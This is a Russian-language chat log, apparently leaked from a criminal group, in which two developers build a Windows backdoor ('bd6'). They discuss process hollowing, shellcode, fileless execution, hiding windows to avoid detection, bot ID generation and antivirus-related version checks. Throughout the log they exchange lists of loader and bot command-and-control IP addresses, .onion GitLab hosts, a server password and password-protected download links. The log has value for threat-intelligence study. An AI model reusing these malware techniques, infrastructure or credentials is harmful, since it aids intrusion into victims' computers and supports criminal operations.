2020-08-21 09:51:49.221396	price	mushroom	а если в фоне, то что отправлять?
2020-08-21 09:52:06.481382	price	mushroom	когда нет лимита на время работы
2020-08-21 09:52:09.920829	mushroom	price	Если фоновый просто PID его на сервер после того как запустил.
2020-08-21 09:52:20.837752	price	mushroom	выдачу не отправлять?
2020-08-21 09:52:26.210826	mushroom	price	Нет.
2020-08-21 09:52:30.809562	price	mushroom	ок
2020-08-21 09:52:45.178295	mushroom	price	Всё что фоновое нас не интересует.
2020-08-26 08:59:58.564076	mushroom	price	Привет. Как успехи?
2020-08-26 11:34:47.816939	price	mushroom	привет
2020-08-26 11:35:43.521328	price	mushroom	нормальные успехи. Поправил exe,dll. Перестроил программу.
2020-08-26 11:37:52.629589	price	mushroom	Поправил shellcode, правда когда запускаю твой код -просто вываливается с ошибкой и ничего не видно, что делает. Но не из программы, просто на except.
2020-08-26 11:38:26.922111	price	mushroom	Осталась последняя задача, холовинг.
2020-08-26 11:39:41.613790	price	mushroom	да, и весит программа для x86 - 16 kB, x64  -20KB
2020-08-26 11:40:40.143058	price	mushroom	выделил стандартную библиотеку в отдельный проект No_CRT_lib.lib
2020-08-26 11:41:08.853647	price	mushroom	загрузил всё на гитлаб.
2020-08-26 11:45:57.078660	price	mushroom	Вот только https://n4iaacb37wmqclht.onion периодически зависает :(, как сейчас например не могу Пуш сделать.
2020-08-26 12:15:00.491277	mushroom	price	OK.
2020-08-26 12:16:02.534148	price	mushroom	Такое бывает, чтоб гитлаб отвисал. Мне нужно знать-это типичное дело, либо специфика моего интернета?
2020-08-26 12:16:34.966393	price	mushroom	И про dll, он запускается, я на ОК давлю, но выдачи с него нет.
2020-08-26 12:16:41.473527	price	mushroom	И от шелкода нет.
2020-08-26 12:20:28.820611	mushroom	price	Это типичное дело, у  еня тоже не роаботаетGitLab. В dll нету выдачи, она же работает в процессе rundll.exe, а он ничего не выводит. У шелл кода тоже нету выдачи никакой.
2020-08-26 12:21:24.686346	price	mushroom	тогда всё в порядке. Сейчас отосплюсь и холовинг сделаю.
2020-08-26 12:22:04.869074	price	mushroom	но странно, я со своего ДЛЛ получал выдачу.
2020-08-26 12:22:29.524521	price	mushroom	правда он консольный был.
2020-08-28 09:29:44.375055	mushroom	price	Привет. Когда смотреть можно будет твой бэкдор?
2020-08-28 09:31:46.967027	mushroom	price	И опять напоминаю писать в redmine каждый день, а не раз в неделю.
2020-08-28 09:31:49.726885	price	mushroom	положил
2020-08-28 09:32:07.181095	mushroom	price	То что в GitLab не собирается у меня.
2020-08-28 09:32:12.032985	price	mushroom	были проблемы с контролем кучи, сейчас их решил
2020-08-28 09:32:30.006987	price	mushroom	а в чем проявляется? не сборка
2020-08-28 09:32:55.231388	mushroom	price	bd6 не собирается, нету crt_no_lib
2020-08-28 09:33:11.002121	mushroom	price	crt_no_lib не собирается Серьезность	Код	Описание	Проект	Файл	Строка	Состояние подавления
Ошибка	C2371	strlen: переопределение; различные базовые типы (компилируется исходный файл printf\printf.c)	no_CRT_lib	C:\Users\ivana\Projects\others\bd6\no_CRT_lib\printf\tinycrt.h	42
2020-08-28 09:33:13.511216	price	mushroom	так её надо тоже собирать
2020-08-28 09:33:51.090177	price	mushroom	там есть проект в решении no_CRT_lib
2020-08-28 09:33:55.087472	mushroom	price	Сделай зависимости проектов тогда, чтобы собиралось всё что нужно.
2020-08-28 09:34:08.960684	mushroom	price	no_CRT_lib
Ошибка      C2371      strlen: переопределение; различные базовые типы (компилируется исходный файл printf\printf.c)      no_CRT_lib      C:\Users\ivana\Projects\others\bd6\no_CRT_lib\printf\tinycrt.h      42
2020-08-28 09:34:15.590515	mushroom	price	Не собирается она.
2020-08-28 09:34:33.128082	price	mushroom	на нем надо нажать правой кнопкой и сделать rebuild
2020-08-28 09:34:46.635140	price	mushroom	сейчас попробуй
2020-08-28 09:34:48.487639	mushroom	price	Тоже самое.
2020-08-28 09:35:02.043533	price	mushroom	я в виртуалке смоделирую
2020-08-28 09:35:09.766169	price	mushroom	у меня все собирается
2020-08-28 09:35:19.652183	price	mushroom	в вртуалке не пробовал
2020-08-28 09:35:26.934664	price	mushroom	у меня вопрос ещё
2020-08-28 09:35:44.290558	price	mushroom	я когда твой exe запускаю, то все отрабатывает
2020-08-28 09:36:24.100207	price	mushroom	а сгенерил свой (он тоже в решении есть test32exe.exe у него stdout не перехватывается. Почему?
2020-08-28 09:37:25.655929	price	mushroom	да, и no_CRT_lib я только на x86 собирал, может ты другую собираешь
2020-08-28 09:37:56.937594	price	mushroom	на других не установлены могут быть значения в насройках
2020-08-28 09:38:06.507808	mushroom	price	Я собираю x64
2020-08-28 09:38:17.556818	mushroom	price	Debug x64
2020-08-28 09:38:24.248403	price	mushroom	попробуй для разногобразия х86 дебуг
2020-08-28 09:38:48.231166	price	mushroom	по крайней мере no_CRT_lib
2020-08-28 09:38:59.698266	price	mushroom	сам бот настроен на все опции
2020-08-28 09:39:04.741951	mushroom	price	x64 основная сборка для работы.
2020-08-28 09:39:14.633196	mushroom	price	x86 собрался no_crt
2020-08-28 09:39:19.273424	price	mushroom	сам бот настроен на все опции
2020-08-28 09:39:30.263962	mushroom	price	x64 надо в первую очередь.
2020-08-28 09:39:47.439258	price	mushroom	сам бот настроен на все опции, и на х64 тоже
2020-08-28 09:40:07.531966	price	mushroom	статич.библиотека была только на х86
2020-08-28 09:40:56.729423	price	mushroom	не вопрос её на всё настроить
2020-08-28 09:42:01.773215	price	mushroom	по моему вопросу можешь подсказать? Почему stdout не читает из моего тестового примера? Сорсы можешь посмотреть в соответствующих проектах.
2020-08-28 09:44:12.634522	mushroom	price	Я пишу там обычной функцией printfA или printfW
2020-08-28 09:44:23.174437	price	mushroom	и я тоже
2020-08-28 09:44:30.492793	price	mushroom	но уже все перепробовал
2020-08-28 09:44:50.168023	price	mushroom	текст одна строчка в цикле
2020-08-28 09:44:59.408826	mushroom	price	Ты пишешь frontf
2020-08-28 09:45:03.810539	mushroom	price	fprintf
2020-08-28 09:45:23.644871	price	mushroom	это последняя попытка, а так было конечно printf
2020-08-28 09:45:48.446430	price	mushroom	ukfdyjt xnj d rjycjkm jyj dslftn
2020-08-28 09:46:17.684548	price	mushroom	главное что в консоль оно выдает
2020-08-28 09:46:38.853498	price	mushroom	а в createprocess только твое
2020-08-28 09:46:46.996397	mushroom	price	А если сделать приложение не консольным.
2020-08-28 09:47:02.178792	price	mushroom	и помоему наоборот твои тесты в консоль не выдают
2020-08-28 09:47:24.119638	price	mushroom	это я не пробовал, хотя смотрел твой тест в ide
2020-08-28 09:47:25.766859	mushroom	price	Не выдают, на деле же это палевно.
2020-08-28 09:48:01.391822	price	mushroom	так тесты же
2020-08-28 09:49:07.892770	mushroom	price	Вот тебе проект этот.
Download: https://qaz.im/load/DGfdrQ/YhbFK6   
Delete: https://qaz.im/index.php?a=delete&q=538436343
Пароль: 1234567890
2020-08-28 09:49:14.030025	price	mushroom	попробую в гуи уйти и попробовать, хотя когда я отлаживал ехе уже давным давно у меня всё везде выдавалось и перехватывалось в пайпах
2020-08-28 09:50:11.753231	mushroom	price	Настрой все зависимости у проектов, чтобы собиралось всё сразу x86 и x64.
2020-08-28 09:50:30.909300	price	mushroom	хорошо
2020-08-28 09:51:35.125363	price	mushroom	ты кучу информации выдаешь с какой целью? координаты, хендлы и пр.
2020-08-28 09:52:11.071456	mushroom	price	Просто для кучи. Первое что в голову пришло выводить у процесса.
2020-08-28 09:52:21.508356	price	mushroom	понял
2020-08-28 09:57:31.592670	mushroom	price	У fprintf надо делать flush ытобы записалось в поток, а  то там пишеться в промежуточный буфер сначала, у меня такое было, не выводилось, но ты это делаешь у себя я вижу.
2020-08-28 09:57:51.598120	price	mushroom	я флаш тоже делаю
2020-08-28 09:57:57.062807	price	mushroom	см тест
2020-08-28 09:58:18.433934	price	mushroom	не дочитал
2020-08-28 09:58:21.926821	price	mushroom	я
2020-08-28 09:59:22.404865	mushroom	price	Ещё stdout у не консольного приложения не работает вроде. По этому я у себя пишу везде через printfA или printfW.
2020-08-28 10:00:31.638752	price	mushroom	таинственно для меня что всё это работало, и все заключается только в createprocess, который отрабатывает на тебе
2020-08-28 10:02:30.806641	mushroom	price	Может из-за того что test32 это юникод приложение, fprintf это ANSI функция.
2020-08-28 10:03:01.314966	price	mushroom	там и широкая версия есть
2020-08-28 10:03:20.555532	price	mushroom	и fprintf в последний момент встал
2020-08-28 10:03:33.570997	price	mushroom	так было printf
2020-08-28 10:03:53.225108	mushroom	price	printf тоже ANSI
2020-08-28 10:03:54.415574	price	mushroom	так на консоль то печатает!
2020-08-28 10:04:29.406456	price	mushroom	у меня debug_printf посмотри-он unicode
2020-08-28 10:04:44.382068	price	mushroom	я в него L"" строку передаю
2020-08-28 10:26:39.930924	mushroom	price	Проверил у себя. У меня всё работает с твоим test32exe.exe
2020-08-28 10:27:04.891299	price	mushroom	вот и я говорю
2020-08-28 10:27:19.949756	mushroom	price	test32dll.exe нету вывода.
2020-08-28 10:27:29.974281	price	mushroom	хрень какая-то, более того у меня даже dll возврат довал
2020-08-28 10:28:56.187278	price	mushroom	был раньше, это я теперь от тебя знаю, что через rundll32 не выдаётся ничего, но когда не знал, то получал
2020-08-28 10:33:25.506012	mushroom	price	LPSTARTUPINFOA
2020-08-28 10:33:44.538113	mushroom	price	А программа у тебя юникод.
2020-08-28 10:33:59.542613	mushroom	price	STARTUPINFO si = { 0 };
2020-08-28 10:34:13.103470	mushroom	price	Создаёшь получается юникод STARTUPINFOW
2020-08-28 10:34:38.638660	mushroom	price	А передаёшь CreateProcessA(NULL, cmdline, NULL, NULL, TRUE, 0, NULL, NULL, (LPSTARTUPINFOA)&si, &pi)
2020-08-28 10:34:48.634210	mushroom	price	LPSTARTUPINFOA
2020-08-28 10:35:05.037492	price	mushroom	спасибо
2020-08-28 10:35:35.746892	mushroom	price	Но это не факт что из-за этого, это я заметил, но не проверял.
2020-08-28 10:35:51.178833	price	mushroom	но с твоим тестом это не объясняет
2020-08-28 10:36:28.771171	mushroom	price	Ты так запутаешься или пиши всё в ANSI или всё в UNICODE, или используй унифвкрсальные версии функций и структур без A или W.
2020-08-28 10:36:51.095772	mushroom	price	Лучше в ANSI тогда размер файла меньше будет.
2020-08-28 10:38:05.189912	price	mushroom	у меня не все функции есть для Ansi, а  так конечно ты прав. Я сейчас с памятью повоевал, займусь и юникодом
2020-08-28 10:40:42.194043	mushroom	price	Тогда всё в юникод.
2020-08-28 10:40:56.322131	price	mushroom	ок
2020-08-28 10:41:00.561668	mushroom	price	В программе у тебы стоит использовать набор символов Юникода
2020-08-28 10:41:09.399652	price	mushroom	я знаю
2020-08-28 10:41:20.694685	mushroom	price	Значит всё что без A или W превращается в W
2020-08-28 10:41:23.191985	price	mushroom	если сменить на мультибайаты беда будет
2020-08-28 10:41:34.053749	price	mushroom	тоже знаю
2020-08-28 10:41:59.270621	mushroom	price	По этому я у себя использую универсальные названия, чтобы можно было легко менять кодировки.
2020-08-28 10:42:50.626347	mushroom	price	si.dwFlags = STARTF_USESHOWWINDOW
2020-08-28 10:42:55.509498	mushroom	price	А это зачем?
2020-08-28 10:43:06.411077	mushroom	price	si.wShowWindow = SW_HIDE;
2020-08-28 10:43:10.199923	mushroom	price	И это?
2020-08-28 10:43:32.752857	mushroom	price	Это легче сделать в функции создания процесса через флаг.
2020-08-28 10:44:19.021023	mushroom	price	CREATE_NO_WINDOW
2020-08-28 10:44:33.733668	mushroom	price	https://docs.microsoft.com/en-us/windows/win32/procthread/process-creation-flags
2020-08-28 10:46:41.188224	mushroom	price	Просто info->dwFlags |= STARTF_USESTDHANDLES;
2020-08-28 10:47:01.544428	mushroom	price	Для пайпа, больше никакие флаги не нужны для startupinfo
2020-08-28 10:47:34.783792	price	mushroom	поправил
2020-08-28 10:48:33.651418	mushroom	price	Проверь сам чтобы было так, открыл проект выбрал bd6 x86\x64 собрать, всё собралось на автомате необходимое.
2020-08-28 10:48:55.652783	price	mushroom	проверяю
2020-08-28 10:49:20.790744	price	mushroom	сейчас флаги проверяю, на очереди зависимости
2020-08-28 10:49:31.815801	mushroom	price	Проверь как я говорил все hollowing возможные, сценарии, как я на прошлой неделе писал. И тогда пиши мне я посмотрю.
2020-08-28 10:50:46.760785	price	mushroom	хорошо
2020-08-28 10:50:48.782901	price	mushroom	спасибо
2020-08-28 11:17:52.407535	mushroom	price	Ближайшие пару часов смотреть нечего будет? Я отойду тогда.
2020-08-28 11:18:07.029741	price	mushroom	нет
2020-08-28 11:18:11.465113	price	mushroom	отходи
2020-08-28 11:18:18.561543	mushroom	price	OK.
2020-08-31 09:49:45.332160	mushroom	price	Привет. В проекте bd6 Компоновщик\Вввод\Дополнительные зависимости напиши $(SolutionDir)bin\$(PlatformTarget)\$(Configuration)\No_CRT_lib.lib
2020-08-31 09:50:10.641437	mushroom	price	Чтобы библиотека твоя находилась.
2020-08-31 09:50:11.234427	price	mushroom	привет
2020-08-31 09:50:25.630006	mushroom	price	Всё остальное пока так же не работает.
2020-08-31 09:50:37.464667	price	mushroom	вот это странно
2020-08-31 09:50:39.418881	mushroom	price	Холловинг не работает, сценарии не работают.
2020-08-31 09:50:44.339716	price	mushroom	это как раз я проверил
2020-08-31 09:50:54.887840	price	mushroom	холловинг не работает
2020-08-31 09:51:16.143533	price	mushroom	но 1 команда, 10, 11, 12  работают
2020-08-31 09:51:16.271817	mushroom	price	Я это и мел ввиду.
2020-08-31 09:51:39.607581	price	mushroom	сейчас занимаюсь холловинглм
2020-08-31 09:51:41.517319	mushroom	price	С сохранением на диск exe работает.
2020-08-31 09:51:57.348515	mushroom	price	Сценарии не работают.
2020-08-31 09:52:08.047422	mushroom	price	dbf20612adcd2353521bf5ef68c5a3a4
2020-08-31 09:52:39.362078	mushroom	price	Можешь там увидеть не один не сработал сценарий.
2020-08-31 09:53:26.207464	mushroom	price	Другое не проверял.
2020-08-31 09:53:40.164605	price	mushroom	хорошо
2020-08-31 09:53:50.460254	price	mushroom	проверяю
2020-08-31 09:54:49.050845	price	mushroom	вот про холловинг - это работающий в боте или просто пример?
2020-08-31 09:55:05.305597	price	mushroom	processhelper.cpp
2020-08-31 10:20:23.345567	mushroom	price	Работающий.
2020-08-31 10:20:33.963638	price	mushroom	ok
2020-09-01 11:25:30.175825	mushroom	price	Привет посмотрел что последнее на гитлаб. Сценарии заработали. Одна загвоздка со сценарием bat с диска. Если cd c:\\r\ndir\r\n запускать через пайп всё как надо получается, если с диска получается вывод другой (нету содержимого диска c:\). Вот последние 2 команды.
2020-09-01 11:25:56.794883	mushroom	price	Холловинг я так понял ещё ты не сделал, там такая же ошибка как вчера 87.
2020-09-01 11:25:58.900913	price	mushroom	Привет, спасибо за просмотр
2020-09-01 11:26:12.680189	price	mushroom	я сейчас делаю, завтра будем смотреть
2020-09-01 11:26:39.735501	price	mushroom	я вчера нашел ошибку у себя в освобождении кучи, она меня сильно беспокоила
2020-09-01 11:26:44.072609	price	mushroom	теперь нет
2020-09-01 11:26:53.677487	mushroom	price	OK&
2020-09-01 11:27:37.330321	price	mushroom	кроме ошибки (если будет время) интересную процедуру нашел
2020-09-01 11:28:01.790780	price	mushroom	работает только в "изоляции" - в отдельной функции
2020-09-01 11:28:33.615681	price	mushroom	я её для получения билда пприменяю
2020-09-01 11:29:02.647804	price	mushroom	если ставил всреди других, то из трёх чисел неправильно печатала то, что нужно
2020-09-01 11:29:30.890673	price	mushroom	void getbuildnumber() {
	RTL_OSVERSIONINFOEXW rtovi = { 0 };
	rtovi.dwOSVersionInfoSize = sizeof(rtovi);
	RtlGetVersionPtr(&rtovi);
	ver_build = rtovi.dwBuildNumber;
	debug_printf(TEXT("%d\n"), rtovi.dwBuildNumber);
}
2020-09-01 11:29:34.634006	price	mushroom	вот это
2020-09-01 11:30:19.837085	price	mushroom	отдельно правильно работает
2020-09-01 11:30:34.960959	price	mushroom	потому в одиночестве
2020-09-01 11:31:33.078761	mushroom	price	А я версию системы просто получаю по версии файла kernel32.dll
2020-09-01 11:31:51.279662	price	mushroom	я тоже так хочу!
2020-09-01 11:32:03.567125	price	mushroom	чтобы с глючными процедурами не связываться
2020-09-01 11:32:25.808628	price	mushroom	но ещё одно
2020-09-01 11:32:39.974567	price	mushroom	перебриал три функции по версии и все разные дают
2020-09-01 11:33:07.644208	price	mushroom	то что я применил-та, которая дает то, что в cmd печатается
2020-09-01 11:33:43.463485	mushroom	price	Download: https://qaz.im/load/yZREBK/QKSshh   
Delete: https://qaz.im/index.php?a=delete&q=1571380876
Пароль: V]K';P4D[!]~M1&.s
2020-09-01 11:33:57.326731	mushroom	price	Пример получения версии.
2020-09-01 11:37:41.942243	price	mushroom	да, у kernel32.dll правильная версия стоит
2020-09-01 11:38:07.475336	price	mushroom	главное длля антивируса я так же версию получаю
2020-09-02 06:24:02.441574	price	mushroom	Привет
2020-09-02 06:24:36.787957	price	mushroom	проверил команду runbat dump 30 cd c:\\r\ndir
2020-09-02 06:25:58.647418	price	mushroom	вот результат C:\Users\Admin\source\repos\bd6>cd c:\ 
c:\>dir
 Том в устройстве C имеет метку System
 Серийный номер тома: 5AC9-0087
 Содержимое папки c:\
06.08.2020  01:53    <DIR>          !!!!HOF
26.08.2020  16:42    <DIR>          !!!!NEWINFO
15.08.2020  22:28    <DIR>          !!!BUZA
02.04.2020  18:51    <DIR>          !UltraSki
11.07.2020  13:47    <DIR>          !VOLA
31.05.2020  17:27    <DIR>          $$$Distributives
2020-09-02 06:28:34.667156	price	mushroom	исправил в CreateProcess -> в cmdline вместо cmd.exe tempfilename.bat поставил просто tempfilename.bat
2020-09-02 06:45:33.735792	price	mushroom	вот такую команду тоже протестировал 	runbat dump 60 d:\r\ncd:d:\\r\ndir
2020-09-02 07:09:19.616171	price	mushroom	Привет
2020-09-02 07:09:19.616999	price	mushroom	проверил команду runbat dump 30 cd c:\\r\ndir
2020-09-02 07:09:19.618069	price	mushroom	вот результат C:\Users\Admin\source\repos\bd6>cd c:\ 
c:\>dir
 Том в устройстве C имеет метку System
 Серийный номер тома: 5AC9-0087
 Содержимое папки c:\
06.08.2020  01:53    <DIR>          !!!!HOF
26.08.2020  16:42    <DIR>          !!!!NEWINFO
15.08.2020  22:28    <DIR>          !!!BUZA
02.04.2020  18:51    <DIR>          !UltraSki
11.07.2020  13:47    <DIR>          !VOLA
31.05.2020  17:27    <DIR>          $$$Distributives
2020-09-02 07:09:19.619157	price	mushroom	исправил в CreateProcess -> в cmdline вместо cmd.exe tempfilename.bat поставил просто tempfilename.bat
2020-09-02 07:09:19.620133	price	mushroom	вот такую команду тоже протестировал 	runbat dump 60 d:\r\ncd:d:\\r\ndir
2020-09-02 10:31:25.982945	mushroom	price	Привет. Посмотрел. Сценарии работают все как надо. Жду когда доделаешь Hollowing.
2020-09-02 10:31:55.368029	price	mushroom	доделываю сейчас
2020-09-02 10:32:28.916280	price	mushroom	привет
2020-09-02 10:35:45.717192	mushroom	price	У тебя у x86 и x64 разные id у ботов, так быть не должно. Он должен быть один всегда, на одном компьютере.
2020-09-02 10:36:14.483057	price	mushroom	меня это тоже задачило. Посмотрю исправлю.
2020-09-02 11:37:54.036793	price	mushroom	id исправил, ранее в дату создания системных папок включались часы минуты и секунды, которые почему-то  по разному отрабатывались в х86 и х64. Теперь в дате только год, месяц и день.
2020-09-02 11:39:40.526157	mushroom	price	У меня в id включены минуты, секунды, миллисекунды и одинаковый id.
2020-09-02 11:39:50.955469	price	mushroom	19.03.2019 04:52:46 <--- x86
2020-09-02 11:40:54.070189	price	mushroom	19.03.2019 04:37:22   <--- x64
2020-09-02 11:41:26.554241	mushroom	price	А что это за дата?
2020-09-02 11:41:58.338891	mushroom	price	У для id беру дату создания папки WINDOWS.
2020-09-02 11:42:40.354174	price	mushroom	это вторая дата - там system32 по ТЗ
2020-09-02 11:43:16.476968	price	mushroom			if (GetFileAttributesExA(windir, GetFileExInfoStandard, &fileAttr)) {
			ftCreatedDate1 = fileAttr.ftCreationTime;
			FileTimeToSystemTime(&ftCreatedDate1, &cm1);

			PathCombineA(winsys32, windir, "System32");
			GetFileAttributesExA(winsys32, GetFileExInfoStandard, &fileAttr);
			ftCreatedDate2 = fileAttr.ftCreationTime;
			FileTimeToSystemTime(&ftCreatedDate2, &cm2);
		}
2020-09-02 11:43:24.655979	mushroom	price	Я понял почему тогда, для x86 это SysWOW64\system32
2020-09-02 11:43:29.237235	price	mushroom	cm1 cm2
2020-09-02 11:43:36.371843	mushroom	price	А для x64 \system32
2020-09-02 11:43:42.629304	mushroom	price	Вот и разные даты.
2020-09-02 11:43:46.138193	price	mushroom	дв, верно
2020-09-02 11:44:04.976676	mushroom	price	Я только даты Windows у себя использую.
2020-09-02 11:44:14.359682	price	mushroom	ну что делать? оставить только дни или оставить секунды для windows
2020-09-02 11:44:25.792536	mushroom	price	А ты делай как хочешь, главное что id был всегда один.
2020-09-02 11:44:38.456277	price	mushroom	теперь да
2020-09-02 11:44:57.490281	price	mushroom	но по ТЗ они принципиально разные
2020-09-02 11:45:35.414693	mushroom	price	Там в ТЗ это как рекомендация как id сделать.
2020-09-02 11:46:00.851965	price	mushroom	понятно. Требование об уникальности я видел
2020-09-02 11:54:00.181835	mushroom	price	Я тут подумал, лучше убери эту дату system32, а то если windows в полночь ставили например, то и день тогда разный может в этой дате быть.
2020-09-02 11:55:45.856366	mushroom	price	Связь работает?
2020-09-02 11:56:04.380837	price	mushroom	Я тут подумал, лучше убери эту дату system32, а то если windows в полночь ставили например, то и день тогда разный может в этой дате быть.
2020-09-02 11:56:04.383814	price	mushroom	Связь работает?
2020-09-09 07:59:28.560042	mushroom	price	Ну как доделал бот?
2020-09-09 08:00:10.816076	price	mushroom	ещё с утра думал, что доделал. Но сейчас:
2020-09-09 08:00:39.616247	price	mushroom	1. Не могу прочитать пайпы с холловингом
2020-09-09 08:01:26.070420	price	mushroom	2. Свой тест запускаю и вижу в дебаговой выдаче отсчеты, а запускаю твой тест и не получается. Сижу отлаживаю
2020-09-09 08:02:54.415710	price	mushroom	сейчас буду пересекать данный мне пример холловинга и тот вариант, который у меня работал на моем примере
2020-09-09 10:11:39.495703	price	mushroom	Process* Process::createProcessHollowing(_In_z_ LPSTR cmd,
	_In_reads_bytes_(payloadSize) PBYTE payload, _In_ SIZE_T payloadSize, _In_opt_ PBYTE input,
	_In_opt_ SIZE_T inputSize)
2020-09-09 10:12:00.440905	price	mushroom	Подскажи пожалуйста, что передается в input?
2020-09-09 10:12:12.732397	price	mushroom	параметры?
2020-09-09 10:12:44.419650	mushroom	price	Скрипт например.
2020-09-09 10:12:52.575261	price	mushroom	и как пайпы включаются для перехвата ввода и вывода вставляемого в хост payload
2020-09-09 10:12:59.330335	mushroom	price	Для безфайлового запуска
2020-09-09 10:13:23.945389	price	mushroom	а какой скрипт для exe?
2020-09-09 10:13:37.224343	mushroom	price	cmd это cmd.exe, а input это cd c:\\r\ndir\r\n например.
2020-09-09 10:13:38.910437	price	mushroom	я команду 10 точу
2020-09-09 10:14:08.445228	price	mushroom	мне для случая когда exe модуль hollowingом вставляется
2020-09-09 10:14:23.039054	mushroom	price	input это то что ты будешь писать в stdinput процесса.
2020-09-09 10:15:10.910608	price	mushroom	и что будет писаться для TestOutput64.exe
2020-09-09 10:15:18.527244	mushroom	price	Ничего.
2020-09-09 10:15:42.271377	mushroom	price	Это на случай если нужно будет.
2020-09-09 10:15:46.657104	price	mushroom	но вот такой код есть
2020-09-09 10:15:47.849399	price	mushroom		if (input)
	{
		if (createProcessWritePipe(&stdinRead, &stdinWrite))
			inheritHandles = TRUE;
		else
		{
			process->m_error = GetLastError();
			return process;
		}
	}
2020-09-09 10:15:57.530962	mushroom	price	Есть.
2020-09-09 10:16:14.976742	price	mushroom	и где тогда пайп заводится для твоего тестового модуля?
2020-09-09 10:16:41.774934	mushroom	price	Там где createProcessReadPipe
2020-09-09 10:16:53.118226	mushroom	price	Для чтения того что выводит процесс.
2020-09-09 10:16:56.485507	price	mushroom	ок смотрю
2020-09-09 10:17:10.915735	mushroom	price	WritePipe для того чтобы писать в процесс.
2020-09-09 10:18:29.592289	mushroom	price	Кстатит createProcessHollowing не читает ничего.
2020-09-09 10:18:37.481059	mushroom	price	Это если процесс без таймаута.
2020-09-09 10:18:49.730740	mushroom	price	А тот что читает это runProcessHollowing
2020-09-09 10:18:52.324303	price	mushroom	надо run запускать?
2020-09-09 10:19:02.500821	price	mushroom	тоже догадался
2020-09-09 10:19:02.785927	mushroom	price	Если читать надо
2020-09-09 10:19:13.684975	price	mushroom	по моему всегда надо?
2020-09-09 10:19:17.450555	price	mushroom	или нет?
2020-09-09 10:19:23.338913	price	mushroom	как понять?
2020-09-09 10:19:25.799685	mushroom	price	Нет. Если таймаут 0 не надо.
2020-09-09 10:19:31.771685	price	mushroom	понял
2020-09-09 10:19:37.694820	mushroom	price	Значит процесс фоновый.
2020-09-09 10:19:42.628744	price	mushroom	сразу как-то получилось
2020-09-09 10:20:01.699685	price	mushroom	сейчас попробую
2020-09-09 10:26:35.775182	price	mushroom	твоя тестовая программа стала ботать и выдавать в debugview
2020-09-09 10:26:37.208853	price	mushroom	[2092] Test output 
[2092] Test output 
[2092] Test output 
[2092] Test output 
[2092] Test output 
[2092] Test output 
[2092] Test output 
[2092] Test output 
[2092] Test output 
[2092] Test output 
[2092] Test output 
[2092] Test output 
[2092] Test output 
[2092] Test output
2020-09-09 10:27:38.705685	price	mushroom	ботать=работать
2020-09-09 10:27:53.549329	mushroom	price	Она и в debug и в stdout пишет.
2020-09-09 10:28:56.342194	price	mushroom	молодец программа (у меня так же, но в моей версии холловинга твоя не запускалась), а тут вон оно что.
2020-09-09 10:29:43.815740	price	mushroom	А чтобы твоя программа в консоль писала надо не писать CREATE_NO_WINDOW&
2020-09-09 10:29:50.434727	price	mushroom	?
2020-09-09 10:30:16.834348	mushroom	price	Если консольная версия.
2020-09-09 10:30:36.266122	price	mushroom	ok
2020-09-09 10:30:48.094507	mushroom	price	В не консольную версию этот флаг игнорируется.
2020-09-15 10:23:10.703368	mushroom	price	Привет. Буза сделал тебе учётную запись?
2020-09-15 10:23:28.786853	price	mushroom	пока нет информации
2020-09-15 10:23:37.378153	price	mushroom	сейчас спрошу
2020-09-15 10:24:09.895574	mushroom	price	Я уже спросил.
2020-09-15 10:24:22.556848	mushroom	price	Сейчас сделает.
2020-09-15 10:24:23.412612	price	mushroom	и я
2020-09-15 10:24:46.160682	price	mushroom	[13:24:18] <!МБ-Буза> щас сделаю 
[13:24:31] <PRICE> спасибо
2020-09-15 10:27:50.655215	price	mushroom	[13:25:16] <!МБ-Буза> g:wSVQVdS2?h1D?9|Z
price
https://scrytnuuszglaugg.onion:4247/
2020-09-15 10:29:07.459141	mushroom	price	Загрузи туда всё так же для группы price.
2020-09-15 10:29:16.846709	price	mushroom	делаю
2020-09-15 11:25:51.732288	price	mushroom	какой IP для запросов
2020-09-15 11:26:08.229595	price	mushroom	по имени не ресолвится запрос
2020-09-15 11:26:25.449570	price	mushroom	HttpSendRequestA
2020-09-15 11:26:30.716265	mushroom	price	лоадеры
82.146.37.128
85.143.221.85
195.123.241.194
37.220.6.126
164.132.76.76
164.68.107.165


бот
93.189.46.41 
212.22.70.4
194.156.98.46
93.189.40.214
54.37.237.253
185.164.32.107
2020-09-15 11:26:47.197899	price	mushroom	к любому что-ли?
2020-09-15 11:27:39.688951	mushroom	price	По списку, к кому удастся подключиться.
2020-09-15 11:27:54.965432	mushroom	price	И проверять подпись сервера надо.
2020-09-15 11:28:02.269145	mushroom	price	В ТЗ написано.
2020-09-15 11:28:15.423675	price	mushroom	почитаю
2020-09-15 11:28:33.904945	price	mushroom	в прошлый раз вроде не было и мы как-то проскочили
2020-09-15 11:28:54.630405	mushroom	price	Это в ТЗ для загрузчика написано, но это одинаково для загрузчика и для бота.
2020-09-15 11:29:07.327693	price	mushroom	ок
2020-09-15 12:46:59.813327	price	mushroom	в прошлый раз к IP бота и лоадера прилагались номера портов. Как на этот раз?
2020-09-15 12:48:00.437054	mushroom	price	На этот раз стандартные порты. 80 для http, 443 для https. Надо всегда использовать https.
2020-09-17 07:47:30.897123	mushroom	price	Привет. Адреса:
лоадеры
82.146.37.128
85.143.221.85
45.148.10.190
86.104.194.77
164.132.76.76
164.68.107.165


бот
51.89.177.8 
212.22.70.4
194.156.98.46
93.189.40.214
54.37.237.253
185.164.32.107
2020-09-17 07:48:19.549762	price	mushroom	всё в порядке, я наладил на новый сервер, продолжаю работать
2020-09-17 07:48:42.676939	price	mushroom	проблема была в смене сервера на ssl
2020-09-17 07:50:36.387645	mushroom	price	Это мне присылают адреса, а я пересылаю тебе, чтобы были всегда актуальные.
2020-09-17 07:50:52.641672	price	mushroom	да, понял, спасибо
2020-09-17 07:51:53.865176	price	mushroom	а как это делать принято, через конфиг файл или вкачивать из некоторого списка? или встраивать и перекомпилировать (некошерно)
2020-09-17 07:52:30.674766	price	mushroom	и второе, с каким ключом валидацию проводить? он всегда один и тот же?
2020-09-17 07:53:21.303394	mushroom	price	Да. Тот, который я давал. Прошей в программе.
2020-09-17 07:53:30.646070	price	mushroom	ок
2020-09-18 13:49:10.987875	mushroom	price	Адреса:
лоадеры
194.5.249.156
85.143.221.85
45.148.10.190
86.104.194.77
164.132.76.76
164.68.107.165


бот
51.89.177.8 
212.22.70.4
194.156.98.46
93.189.40.214
54.37.237.253
185.164.32.107
2020-09-18 14:31:13.033111	price	mushroom	спасибо
2020-09-18 14:32:03.266248	price	mushroom	но вот вопрос, я эти вектор этих адресов вшил. Но в реальности они как будут в бот поставляться? Сейчас нужна перекомпиляция.
2020-09-18 14:36:54.047149	mushroom	price	Да.
2020-09-18 14:37:49.446945	price	mushroom	спасибо
